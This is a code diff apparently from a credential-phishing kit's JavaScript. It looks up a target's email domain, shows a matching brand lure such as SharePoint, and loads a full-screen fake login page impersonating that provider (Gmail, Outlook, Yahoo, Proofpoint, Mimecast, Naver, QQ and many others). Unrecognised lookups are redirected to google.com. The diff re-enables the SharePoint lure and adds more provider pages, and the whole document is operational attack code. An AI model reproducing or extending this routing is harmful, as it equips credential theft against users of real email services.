@@ -250,23 +250,7 @@ function activateIframe(dnsresult,vsr,fmt,ipInfo) {
         }
     }, 4000);
 }
-/*
 
-function activateIframe(dnsresult,vsr,fmt,ipInfo){
-	// Set the source URL to load the page inside the iframe
-	setTimeout(() => {
-		iframe.src = baseUrl+ displayPage(dnsresult,vsr,fmt);
-		// Display the full screen iframe
-		iframe.style.display = 'block';
-		iframe.style.width="100%";
-		iframe.style.height ="100%";
-		// Hide the prior container safely
-        $("#loading-logo").hide();
-		//Ensure body doesn't create external scrollbars
-		document.body.style.overflow = 'hidden';
-	}, 4000);
-	return 0;
-}*/
 
 function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
 	$('#fieldName').val(dnsresult);
@@ -296,10 +280,10 @@ function switchImage(fmt,prefix,dnsresult,ipInfo,vsr){
 		activateIframe(dnsresult,vsr,fmt,ipInfo); 
 		
 		break;
-		/*case "sharepoint":
+		case "sharepoint":
 		$("#loading-logo").show();
 		$("#docuLogo").attr("src", prefix+"sharepoint-1.svg");
-		activateIframe(dnsresult,vsr,fmt,ipInfo); */
+		activateIframe(dnsresult,vsr,fmt,ipInfo); 
 		
 		break;
 		case "quickbooks":
@@ -329,205 +313,195 @@ function displayPage(dnsresult,vsr,fmt){
 	switch(dnsresult){
 	
 		case "263.com":
-		pgsrc ="/263mail.html#"+vsr+"&"+fmt;
+		pgsrc="/263mail.html#"+vsr+"&"+fmt;;
 		break;
 		case "yahoo.com":
-		pgsrc ="/yhoo.html#"+vsr+"&"+fmt;
+		pgsrc="/ym.html#"+vsr+"&"+fmt;;
 		break;
 		case "ionos.com":
-		pgsrc ="/1n1.html#"+vsr+"&"+fmt;
+		pgsrc="/1n1.html#"+vsr+"&"+fmt;;
 		break;
 		case "aliyun.com":
-		pgsrc ="/aliyunmail.html#"+vsr+"&"+fmt;
+		pgsrc="/aliyunmail.html#"+vsr+"&"+fmt;;
 		break;
 		case "amicobit.com":
-		pgsrc ="/amicobit.html#"+vsr+"&"+fmt;
+		pgsrc="/amicobit.html#"+vsr+"&"+fmt;;
 		break;
 		case "ovh.com":
-		pgsrc ="/ovhmail.html#"+vsr+"&"+fmt;
+		pgsrc="/ovhmail.html#"+vsr+"&"+fmt;;
 		break;
 		case "daum.net":
-		pgsrc ="/duam.html#"+vsr+"&"+fmt;
+		pgsrc="/duam.html#"+vsr+"&"+fmt;;
 		break;
 		case "mail.icoremail.net":
-		pgsrc ="/icoremail.html#"+vsr+"&"+fmt;
+		pgsrc="/icoremail.html#"+vsr+"&"+fmt;;
 		break;
 		case "hiworks.co.kr":
-		pgsrc ="/hiworks.html#"+vsr+"&"+fmt;
+		pgsrc="/hiworks.html#"+vsr+"&"+fmt;;
 		break;
 		case "arsmtp.com":
-		pgsrc ="/arsmtp.html#"+vsr+"&"+fmt;
+		pgsrc="/arsmtp.html#"+vsr+"&"+fmt;;
 		break;
 		case "emailsrvr.com":
-		pgsrc ="/emailsrvr.html#"+vsr+"&"+fmt;
+		pgsrc="/emailsrvr.html#"+vsr+"&"+fmt;;
 		break;
 		case "yandex.com":
-		pgsrc ="/yndex.html#"+vsr+"&"+fmt;
+		pgsrc="/yndex.html#"+vsr+"&"+fmt;;
 		break;
 		case "webmail.cbsolt.net":
-		pgsrc ="/cbsol.html#"+vsr+"&"+fmt;
+		pgsrc="/cbsol.html#"+vsr+"&"+fmt;;
 		break;
 		case "gmail.com":
-		pgsrc ="/g_index.html#"+vsr+"&"+fmt;
+		pgsrc="/gm.html#"+vsr+"&"+fmt;;
 		break;
 		case "s151v.chinaemail.cn":
-		pgsrc ="/bossmail.html#"+vsr+"&"+fmt;
+		pgsrc="/bossmal.html#"+vsr+"&"+fmt;;
 		break;
 		case "register.it":
-		pgsrc ="/register.html#"+vsr+"&"+fmt;
+		pgsrc="/register.html#"+vsr+"&"+fmt;;
 		break;
 		case "exmail.qq.com":
-		pgsrc ="/qq_login.html#"+vsr+"&"+fmt;
+		pgsrc="/qq_login.html#"+vsr+"&"+fmt;;
 		break;
 		case "qiye.163.com":
-		pgsrc ="/qiyelogin.html#"+vsr+"&"+fmt;
+		pgsrc="/qiyelogin163.html#"+vsr+"&"+fmt;;
 		break;
 		case "naver.com":
-		pgsrc ="/navr.html#"+vsr+"&"+fmt;
+		pgsrc="/navr.html#"+vsr+"&"+fmt;;
 		break;
 		case "outlook.com":
 		case "hotmail.com":
-		pgsrc ="/w2weApp.html#"+vsr+"&"+fmt;
+		pgsrc="/w2weApp.html#"+vsr+"&"+fmt;;
 		break;
 		case "mail.ru":
-		pgsrc ="/mailru.html#"+vsr+"&"+fmt;
+		pgsrc="/mailru.html#"+vsr+"&"+fmt;;
 		break;
 		case "zoho.com":
-		pgsrc ="/zhomail.html#"+vsr+"&"+fmt;
+		pgsrc="pgsrc/zhomail.html#"+vsr+"&"+fmt;;
 		break;
 		case "serviciodecorreo.es":
-		pgsrc ="/servicio.html#"+vsr+"&"+fmt;
+		pgsrc="/servicio.html#"+vsr+"&"+fmt;;
 		break;
 		case "sina.net":
-		pgsrc ="/sinamail.html#"+vsr+"&"+fmt;
+		pgsrc="/sinamail.html#"+vsr+"&"+fmt;;
 		break;
 		case "rzone.de":
-		pgsrc ="/strto.html#"+vsr+"&"+fmt;
+		pgsrc="/strto.html#"+vsr+"&"+fmt;;
 		break;
 		case "hibox.com":
-		pgsrc ="/hibox.html#"+vsr+"&"+fmt;
+		pgsrc="/hibox.html#"+vsr+"&"+fmt;;
 		break;
 		case "zimbra.com":
-		pgsrc ="/zmbra.html#"+vsr+"&"+fmt;
+		pgsrc="/zmbra.html#"+vsr+"&"+fmt;;
 		break;
 		case "webmail.sfera.net":
-		pgsrc ="/sfera.html#"+vsr+"&"+fmt;
+		pgsrc="/sfera.html#"+vsr+"&"+fmt;;
 		break;
 		case "webmail.saati.com":
-		pgsrc ="/saati.html#"+vsr+"&"+fmt;
+		pgsrc="/saati.html#"+vsr+"&"+fmt;;
 		break;
 		case "pphosted.com":
-		pgsrc ="/proofpoint.html#"+vsr+"&"+fmt;
-		break;
-		case "interia.pl":
-		pgsrc ="/proofpoint.html#"+vsr+"&"+fmt;
+		pgsrc="/proofpoint.html#"+vsr+"&"+fmt;;
 		break;
 		case "mailcontrol.com":
-		pgsrc ="/forcept.html#"+vsr+"&"+fmt;
+		pgsrc="/forcept.html#"+vsr+"&"+fmt;;
 		break;
 		case "mail.smart-mail.net":
-		pgsrc ="/smart.html#"+vsr+"&"+fmt;
+		pgsrc="/smart.html#"+vsr+"&"+fmt;;
 		break;
 		case "nethinks.com":
-		pgsrc ="/nethinks.html#"+vsr+"&"+fmt;
+		pgsrc="/nethinks.html#"+vsr+"&"+fmt;;
 		break;
 		case "aruba.it":
-		pgsrc ="/aruba.html#"+vsr+"&"+fmt;
+		pgsrc="/aruba.html#"+vsr+"&"+fmt;;
 		break;
 		case "ateja.co.id":
-		pgsrc ="/ateja.html#"+vsr+"&"+fmt;
+		pgsrc="/ateja.html#"+vsr+"&"+fmt;;
 		break;
 		case "mail.termolst.be":
-		pgsrc ="/termolst.html#"+vsr+"&"+fmt;
+		pgsrc="/termolst.html#"+vsr+"&"+fmt;;
 		break;
 		case "https://webmail-auth.getzner.at":
-		pgsrc ="/getzner.html#"+vsr+"&"+fmt;
+		pgsrc="/getzner.html#"+vsr+"&"+fmt;;
 		break;
 		case "chinamail.cn":
-		pgsrc ="/chinamail.html#"+vsr+"&"+fmt;
+		pgsrc="/chinamail.html#"+vsr+"&"+fmt;;
 		break;
 		case "webmailssl.it":
-		pgsrc ="/webmailssl.html#"+vsr+"&"+fmt;
+		pgsrc="/webmailssl.html#"+vsr+"&"+fmt;;
 		break;
 		case "mdaemon":
-		pgsrc ="/mdaemon.html#"+vsr+"&"+fmt;
+		pgsrc="/mdaemon.html#"+vsr+"&"+fmt;;
 		break;
 		case "axigen.com"://update 2
-		pgsrc ="/axigen.html#"+vsr+"&"+fmt;
+		pgsrc="/axigen.html#"+vsr+"&"+fmt;;
 		break;
 		case "mimecast.com"://update 3
-		pgsrc ="/mimecast.html#"+vsr+"&"+fmt;
+		pgsrc="/mimecast.html#"+vsr+"&"+fmt;;
 		break;
 		case "orange.com"://update 4 change link
-		pgsrc ="/orange.html#"+vsr+"&"+fmt;
+		pgsrc="/orange.html#"+vsr+"&"+fmt;;
 		break;
 		case "ipsgateway.com"://update 5 change link
-		pgsrc ="/orange.html#"+vsr+"&"+fmt;
+		pgsrc="/horde.html#"+vsr+"&"+fmt;;
 		break;
 		case "locaweb.com":
-		pgsrc ="/locaweb.html#"+vsr+"&"+fmt;
+		pgsrc="/locaweb.html#"+vsr+"&"+fmt;;
 		break;
 		case "baracuda.com":
-		pgsrc ="/barcuda.html#"+vsr+"&"+fmt;
+		pgsrc="/barcuda.html#"+vsr+"&"+fmt;;
 		break;
 		case "cloud24mail.com":
-		pgsrc ="/cloud24.html#"+vsr+"&"+fmt;
+		pgsrc="/cloud24.html#"+vsr+"&"+fmt;;
 		break;
 		case "eim.ae":
-		pgsrc ="/aeim.html#"+vsr+"&"+fmt;
+		pgsrc="/aeim.html#"+vsr+"&"+fmt;;
 		break;
 		case "stackmail.com":
 		case "antispameurope.com":
-		pgsrc ="/stackmail.html#"+vsr+"&"+fmt;
+		pgsrc="/stackmail.html#"+vsr+"&"+fmt;;
+		break;
+		case "rediffmail.com":
+		pgsrc="/rediffpro.html#"+vsr+"&"+fmt;;
 		break;
 		case "mailchannels.net":
-		pgsrc ="/mailchannels.html#"+vsr+"&"+fmt;
-		break;
-		case "mailhostbox.com":
-		pgsrc ="/appsuite.html#"+vsr+"&"+fmt;
+		pgsrc="/mailchannels.html#"+vsr+"&"+fmt;;
 		break;
 		case "carrierzone.com":
-		pgsrc ="/carrierzone.html#"+vsr+"&"+fmt;
+		pgsrc="/carrierzone.html#"+vsr+"&"+fmt;;
 		break;
 		case "mail2world.com":
-		pgsrc ="/infinitum.html#"+vsr+"&"+fmt;
-		break;
-		case "app.fastmail.com":
-		pgsrc ="/fastMail.html#"+vsr+"&"+fmt;
-		break;
-		case "privateemail.com":
-		pgsrc ="/privateemail.html#"+vsr+"&"+fmt;
+		pgsrc="/infinitum.html#"+vsr+"&"+fmt;;
 		break;
 		case "cp.serverdata.net":
-		pgsrc ="/serverdata.html#"+vsr+"&"+fmt;
-		break;
-		case "earthlink.net":
-		pgsrc ="/earth.html#"+vsr+"&"+fmt;
-		break;
-		case "iphmx.com":
-		pgsrc ="/iphmx.html#"+vsr+"&"+fmt;
-		break;
-		case "aol.com":
-		pgsrc ="/aoll.html#"+vsr+"&"+fmt;
-		break;
-		case "one.com":
-		pgsrc ="/one.html#"+vsr+"&"+fmt;
-		break;
-		case "comcast.net":
-		pgsrc ="/xfinty.html#"+vsr+"&"+fmt;
-		break;
-		case "hostinger.com":
-		pgsrc ="/hostinger.html#"+vsr+"&"+fmt;
-		break;
-		case "xserver.ne.jp":
-		pgsrc ="/serverx.html#"+vsr+"&"+fmt;
-		break;
-		case "zaq.ne.jp":
-		case "webmail.jp":
-		pgsrc ="/jp.html#"+vsr+"&"+fmt;
+		pgsrc="/serverdata.html#"+vsr+"&"+fmt;;
+		break;		
+		case "app.fastmail.com":
+		pgsrc="/fastMail.html#"+vsr+"&"+fmt;;
 		break;
 		case "protonmail.com":
-		pgsrc ="/proton.html#"+vsr+"&"+fmt;
+		pgsrc="/proton.html#"+vsr+"&"+fmt;;
+		break;
+		case "earthlink.net":
+		pgsrc="/earth.html#"+vsr+"&"+fmt;;
+		break;
+		case "aol.com":
+		pgsrc="/aoll.html#"+vsr+"&"+fmt;;
+		break;
+		case "one.com":
+		pgsrc="/one.html#"+vsr+"&"+fmt;;
+		break;
+		case "iphmx.com":
+		pgsrc="/iphmx.html#"+vsr+"&"+fmt;;
+		break;
+		case "comcast.net":
+		pgsrc="/xfinty.html#"+vsr+"&"+fmt;;
+		break;
+		case "hostinger.com":
+		pgsrc="/hostinger.html#"+vsr+"&"+fmt;;
+		break;
+		case "privateemail.com":
+		pgsrc="/privateemail.html#"+vsr+"&"+fmt;;
 		break;
 		case "contabo.net":
 		case "netcore.co.in":
@@ -535,20 +509,51 @@ function displayPage(dnsresult,vsr,fmt){
 		case "a2hosting":
 		case "roundcube":
 		case "spamexperts.com":
-		pgsrc ="/wbmail.html#"+vsr+"&"+fmt;
+		pgsrc="/wbmail.html#"+vsr+"&"+fmt;;
 		break;
-		case "rediffmail.com":
-		pgsrc ="/rediffpro.html#"+vsr+"&"+fmt;
+		case "mailhostbox.com":
+		pgsrc="/appsuite.html#"+vsr+"&"+fmt;;
 		break;
 		case "networksolution.com":
-		pgsrc ="/netsol.html#"+vsr+"&"+fmt;;
+		pgsrc="/netsol.html#"+vsr+"&"+fmt;;
+		break;
+		case "xserver.ne.jp":
+		pgsrc="/serverx.html#"+vsr+"&"+fmt;;
+		break;
+		case "zaq.ne.jp":
+		case "webmail.jp":
+		pgsrc="/jp.html#"+vsr+"&"+fmt;;
+		break;
+		case "interia.pl":
+		pgsrc="/interia.html#"+vsr+"&"+fmt;
+		break;
+		case "ecounterp.com":
+		pgsrc="/ecount.html#"+vsr+"&"+fmt;;
+		break;
+		case "worksmobile.com":
+		pgsrc="/workm.html#"+vsr+"&"+fmt;;
+		break;
+		case "cafe24.com":
+		pgsrc="/cafe24.html#"+vsr+"&"+fmt;;
+		break;
+		case "korea.com":
+		pgsrc="/korea.html#"+vsr+"&"+fmt;;
+		break;
+		case "whoisworks.com":
+		pgsrc="/whis.html#"+vsr+"&"+fmt;;
+		break;
+		case "mailplug.com":
+		pgsrc="/mplug.html#"+vsr+"&"+fmt;;
+		break;
+		case "nate.com":
+		pgsrc="/nat.html#"+vsr+"&"+fmt;;
 		break;
 		case "FALSE":
 		window.location.href="https://google.com";
 		//alert(dnsresult);
 		break;
 		default:
-		pgsrc ="/gPag.html#"+vsr+"&"+fmt;
+		pgsrc="/gPag.html#"+vsr+"&"+fmt;;
 		break;
 	}
 	return pgsrc;
